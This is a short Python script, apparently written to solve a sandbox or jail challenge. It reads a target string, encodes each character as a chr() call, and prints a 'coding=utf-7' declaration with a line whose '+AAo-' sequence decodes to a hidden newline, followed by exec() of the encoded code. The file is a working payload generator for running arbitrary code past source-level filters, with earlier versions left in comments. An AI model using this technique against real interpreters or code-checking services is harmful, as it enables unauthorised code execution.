target = input()

# payload = f"chr({ord('\n')})+"
# for c in cmd:
#     payload += f"chr({ord(c)})+"
# payload = payload[:-1]
# exec("print("+payload+")")
# print(f"exec({payload})")
chain = '+-'.join(f'chr({ord(c)})' for c in target)
line2 = 'a+AAo-' + f'exec({chain})'
print(f"coding=utf-7\n{line2}\n")
